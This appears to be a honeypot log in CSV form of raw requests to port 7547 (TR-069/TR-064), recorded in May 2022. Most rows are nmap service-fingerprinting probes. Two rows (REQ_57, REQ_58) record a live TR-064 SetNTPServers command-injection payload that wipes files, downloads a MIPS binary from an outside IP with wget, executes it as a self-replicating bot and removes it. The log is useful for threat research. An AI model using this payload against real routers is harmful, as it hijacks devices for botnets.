ID,ADDR,VALUE,TIME
REQ_19_P7547,"('152.32.216.16', 64436)","b""\x16\x03\x01\x00\xee\x01\x00\x00\xea\x03\x03\x10\xb8\x00;\xae`\x99\x89\xa8XlF\xea9>#'\x1f\xfc\x83\xd3\x0f\x1f\xe2\xd1\xde\xfc7\xca\xe4\x8b\xf9 E\xa9R\xc9\xb4X\xf9\x8c\x18_Bk?T|\x08\x7f\xc2\xd3\xa6\xb0\xd0:\x15+8\r\r\x1e\xd1>\x86\x00&\xc0/\xc00\xc0+\xc0,\xcc\xa8\xcc\xa9\xc0\x13\xc0\t\xc0\x14\xc0\n\x00\x9c\x00\x9d\x00/\x005\xc0\x12\x00\n\x13\x01\x13\x03\x13\x02\x01\x00\x00{\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\n\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x1a\x00\x18\x08\x04\x04\x03\x08\x07\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x05\x03\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00\x00+\x00\t\x08\x03\x04\x03\x03\x03\x02\x03\x01\x003\x00&\x00$\x00\x1d\x00 >s\xa2\xceO\x1bP\xf8x#\xf6\x11l&\xed\xc1\xf4q\xa0\xf2=\x91O9\x86,\xea\x03DC\x9f4""",2022-05-16 15:27:24.507922
REQ_20_P7547,"('152.32.216.16', 11894)",b'OPTIONS / HTTP/1.0\r\n\r\n',2022-05-16 15:27:26.811196
REQ_21_P7547,"('152.32.216.16', 13944)",b'OPTIONS / RTSP/1.0\r\n\r\n',2022-05-16 15:27:29.383452
REQ_22_P7547,"('152.32.216.16', 16142)",b'\x80\x00\x00(r\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:27:31.684467
REQ_23_P7547,"('152.32.216.16', 18112)",b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00',2022-05-16 15:27:34.009488
REQ_24_P7547,"('152.32.216.16', 20296)",b'\x00*(\xff\x01 \x00\x01\x00\x00\x00\x00\x00\x01\x03www\x05baidu\x03com\x00\x00\x01\x00\x01\x00\x00)\x10\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:27:36.285304
REQ_25_P7547,"('152.32.216.16', 22034)",b'\x00\x1e\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',2022-05-16 15:27:38.561189
REQ_26_P7547,"('152.32.216.16', 24008)",b'\x00\x0c\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:27:40.850089
REQ_27_P7547,"('152.32.216.16', 26520)",b'AMQP\x00\x00\t\x01',2022-05-16 15:27:43.127130
REQ_28_P7547,"('152.32.216.16', 29164)",b'HELP\r\n',2022-05-16 15:27:45.439704
REQ_29_P7547,"('152.32.216.16', 31990)","b'\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G\xd7\xf7\xba,\xee\xea\xb2`~\xf3\x00\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb<=\xdbo\xef\x10n\x00\x00(\x00\x16\x00\x13\x00\n\x00f\x00\x05\x00\x04\x00e\x00d\x00c\x00b\x00a\x00`\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x01\x00'",2022-05-16 15:27:48.780334
REQ_30_P7547,"('152.32.216.16', 34738)",b'\x03\x00\x00*%\xe0\x00\x00\x00\x00\x00Cookie: mstshash=nmap\r\n\x01\x00\x08\x00\x03\x00\x00\x00',2022-05-16 15:27:51.703283
REQ_31_P7547,"('152.32.216.16', 38178)",b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00',2022-05-16 15:27:53.989878
REQ_32_P7547,"('152.32.216.16', 41322)","b'\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x00\x00\x0c\x00/\x00\n\x00\x13\x009\x00\x04\x00\xff\x01\x00\x000\x00\r\x00,\x00*\x00\x01\x00\x03\x00\x02\x06\x01\x06\x03\x06\x02\x02\x01\x02\x03\x02\x02\x03\x01\x03\x03\x03\x02\x04\x01\x04\x03\x04\x02\x01\x01\x01\x03\x01\x02\x05\x01\x05\x03\x05\x02'",2022-05-16 15:27:56.463272
REQ_33_P7547,"('152.32.216.16', 44726)",b'\x00\x00\x00qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\n\xa4\x81^0\\\xa0\x07\x03\x05\x00P\x80\x00\x10\xa2\x04\x1b\x02NM\xa3\x170\x15\xa0\x03\x02\x01\x00\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\xa5\x11\x18\x0f19700101000000Z\xa7\x06\x02\x04\x1f\x1e\xb9\xd9\xa8\x170\x15\x02\x01\x12\x02\x01\x11\x02\x01\x10\x02\x01\x17\x02\x01\x01\x02\x01\x03\x02\x01\x02',2022-05-16 15:27:59.425542
REQ_34_P7547,"('152.32.216.16', 47506)",b'\x00\x00\x00\xa4\xffSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00',2022-05-16 15:28:01.706656
REQ_35_P7547,"('152.32.216.16', 50064)",b'l\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:28:04.010578
REQ_36_P7547,"('152.32.216.16', 52924)",b'GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0\r\n\r\n',2022-05-16 15:28:06.350227
REQ_37_P7547,"('152.32.216.16', 54382)",b'\x01default\n',2022-05-16 15:28:09.096148
REQ_38_P7547,"('152.32.216.16', 56656)",b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00\n\x01\x00\n\x01\x00\x02\x01\x00\x02\x01d\x01\x01\x00\x87\x0bobjectClass0\x84\x00\x00\x00\x00',2022-05-16 15:28:11.366875
REQ_39_P7547,"('152.32.216.16', 58604)",b'0\x0c\x02\x01\x01`\x07\x02\x01\x02\x04\x00\x80\x00',2022-05-16 15:28:13.669089
REQ_40_P7547,"('152.32.216.16', 61028)",b'OPTIONS sip:nm SIP/2.0\r\nVia: SIP/2.0/TCP nm;branch=foo\r\nFrom: <sip:nm@nm>;tag=root\r\nTo: <sip:nm2@nm2>\r\nCall-ID: 50000\r\nCSeq: 42 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\nContact: <sip:nm@nm>\r\nAccept: application/sdp\r\n\r\n',2022-05-16 15:28:16.236637
REQ_41_P7547,"('152.32.216.16', 62716)",b'TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00',2022-05-16 15:28:18.953738
REQ_42_P7547,"('152.32.216.16', 64728)",b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',2022-05-16 15:28:21.217789
REQ_43_P7547,"('152.32.216.16', 12040)",b'\x06\x83\xa4Join\xc3\xa5Nodes\x01\xacUserStateLen\x00\x87\xa4Addr\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xc0\xa88\x01\xabIncarnation\x01\xa4Meta\xc0\xa4Name\xafDESKTOP-NR8TTVR\xa4Port\xcd\x1f\n\xa5State\x00\xa3Vsn\xa6\x01\x05\x02\x00\x00\x00',2022-05-16 15:28:23.539628
REQ_44_P7547,"('152.32.216.16', 14364)",b'\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\xff\xff\x00\x01none\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ppap\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:28:25.853596
REQ_45_P7547,"('152.32.216.16', 16402)",b'DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00\xff\x01\xff\x13',2022-05-16 15:28:28.448340
REQ_46_P7547,"('152.32.216.16', 18860)",b':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 15:28:30.866420
REQ_47_P7547,"('152.32.216.16', 21488)",b'JRMI\x00\x02K',2022-05-16 15:28:33.166325
REQ_48_P7547,"('152.32.216.16', 24340)",b'\x01\x00\x00\xfd\xce\xfa\x0b\xb0\xa0\x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00\xf0\xf0\xf0\xf0\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00\xe0m\xdf_',2022-05-16 15:28:35.483748
REQ_49_P7547,"('152.32.216.16', 26904)","b'\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01\x00 \x00:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\xe6\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00(CONNECT_DATA=(COMMAND=version))'",2022-05-16 15:28:38.136111
REQ_50_P7547,"('152.32.216.16', 29478)",b'\x12\x01\x004\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x0c\x03\x00(\x00\x04\xff\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00',2022-05-16 15:28:40.433357
REQ_51_P7547,"('152.32.216.16', 31860)",b'stats\r\n',2022-05-16 15:28:42.723395
REQ_52_P7547,"('152.32.216.16', 34848)",b'\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00',2022-05-16 15:28:45.015317
REQ_53_P7547,"('152.32.216.16', 38422)",b'A\x00\x00\x00:0\x00\x00\xff\xff\xff\xff\xd4\x07\x00\x00\x00\x00\x00\x00test.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x1b\x00\x00\x00\x01serverStatus\x00\x00\x00\x00\x00\x00\x00\xf0?\x00',2022-05-16 15:28:47.310243
REQ_54_P7547,"('152.32.216.16', 41176)",b'*1\r\n$4\r\ninfo\r\n',2022-05-16 15:28:49.605520
REQ_55_P7547,"('152.32.216.16', 44022)",b'GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00',2022-05-16 15:28:52.700785
REQ_56_P7547,"('152.32.216.16', 46374)",b'\x10\x10\x00\x04MQTT\x04\x02\x00\x1e\x00\x04nmap',2022-05-16 15:28:55.437590
REQ_57_P7547,"('209.124.100.190', 33775)","b'POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Messiah/2.0\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 526\r\n<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=""urn:dslforum-org:service:Time:1"">   <NewNTPServer1>`rm -rf *;cd /tmp;wget http://51.81.133.91/FKKK/NW_BBBmips; chmod 777 NW_BBBmips; ./NW_BBBmips TR-064.Selfrep; rm -rf NW_BBBmips`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>'",2022-05-16 15:53:43.458364
REQ_58_P7547,"('209.124.100.190', 33780)","b'POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Messiah/2.0\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 526\r\n<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=""urn:dslforum-org:service:Time:1"">   <NewNTPServer1>`rm -rf *;cd /tmp;wget http://51.81.133.91/FKKK/NW_BBBmips; chmod 777 NW_BBBmips; ./NW_BBBmips TR-064.Selfrep; rm -rf NW_BBBmips`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>'",2022-05-16 15:53:43.545472
REQ_59_P7547,"('45.33.101.246', 43846)",b'\r\n\r\n',2022-05-16 17:06:47.308154
REQ_60_P7547,"('45.33.101.246', 50006)",b'GET / HTTP/1.0\r\n\r\n',2022-05-16 17:06:47.371539
REQ_61_P7547,"('45.33.101.246', 51108)",b'OPTIONS / HTTP/1.0\r\n\r\n',2022-05-16 17:06:48.523235
REQ_62_P7547,"('45.33.101.246', 52002)",b'OPTIONS / RTSP/1.0\r\n\r\n',2022-05-16 17:06:49.681308
REQ_63_P7547,"('45.33.101.246', 52932)",b'\x80\x00\x00(r\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 17:06:50.837161
REQ_64_P7547,"('45.33.101.246', 54040)",b'\x00\x1e\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',2022-05-16 17:06:51.980879
REQ_65_P7547,"('45.33.101.246', 55070)",b'HELP\r\n',2022-05-16 17:06:53.144249
REQ_66_P7547,"('45.33.101.246', 56406)","b'\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G\xd7\xf7\xba,\xee\xea\xb2`~\xf3\x00\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb<=\xdbo\xef\x10n\x00\x00(\x00\x16\x00\x13\x00\n\x00f\x00\x05\x00\x04\x00e\x00d\x00c\x00b\x00a\x00`\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x01\x00'",2022-05-16 17:06:54.297914
REQ_67_P7547,"('45.33.101.246', 57688)","b'\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x00\x00\x0c\x00/\x00\n\x00\x13\x009\x00\x04\x00\xff\x01\x00\x000\x00\r\x00,\x00*\x00\x01\x00\x03\x00\x02\x06\x01\x06\x03\x06\x02\x02\x01\x02\x03\x02\x02\x03\x01\x03\x03\x03\x02\x04\x01\x04\x03\x04\x02\x01\x01\x01\x03\x01\x02\x05\x01\x05\x03\x05\x02'",2022-05-16 17:06:55.446888
REQ_68_P7547,"('45.33.101.246', 58840)",b'\x00\x00\x00qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\n\xa4\x81^0\\\xa0\x07\x03\x05\x00P\x80\x00\x10\xa2\x04\x1b\x02NM\xa3\x170\x15\xa0\x03\x02\x01\x00\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\xa5\x11\x18\x0f19700101000000Z\xa7\x06\x02\x04\x1f\x1e\xb9\xd9\xa8\x170\x15\x02\x01\x12\x02\x01\x11\x02\x01\x10\x02\x01\x17\x02\x01\x01\x02\x01\x03\x02\x01\x02',2022-05-16 17:06:56.593905
REQ_69_P7547,"('45.33.101.246', 59838)",b'\x00\x00\x00\xa4\xffSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00',2022-05-16 17:06:57.745569
REQ_70_P7547,"('45.33.101.246', 60664)",b'l\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-16 17:06:58.898954
REQ_71_P7547,"('45.33.101.246', 33402)",b'OPTIONS sip:nm SIP/2.0\r\nVia: SIP/2.0/TCP nm;branch=foo\r\nFrom: <sip:nm@nm>;tag=root\r\nTo: <sip:nm2@nm2>\r\nCall-ID: 50000\r\nCSeq: 42 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\nContact: <sip:nm@nm>\r\nAccept: application/sdp\r\n\r\n',2022-05-16 17:07:00.047185
REQ_72_P7547,"('45.33.101.246', 34636)","b'GET / HTTP/1.1\r\nHost: www\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\r\n\r\n'",2022-05-16 17:07:06.254821
REQ_73_P7547,"('45.33.101.246', 34640)",b'',2022-05-16 17:07:11.265763
REQ_74_P7547,"('45.33.101.246', 34688)","b'\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x00\x00\x0c\x00/\x00\n\x00\x13\x009\x00\x04\x00\xff\x01\x00\x000\x00\r\x00,\x00*\x00\x01\x00\x03\x00\x02\x06\x01\x06\x03\x06\x02\x02\x01\x02\x03\x02\x02\x03\x01\x03\x03\x03\x02\x04\x01\x04\x03\x04\x02\x01\x01\x01\x03\x01\x02\x05\x01\x05\x03\x05\x02'",2022-05-16 17:07:12.384885
REQ_75_P7547,"('45.33.101.246', 34686)",b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbbb0100000001',2022-05-16 17:07:13.499578
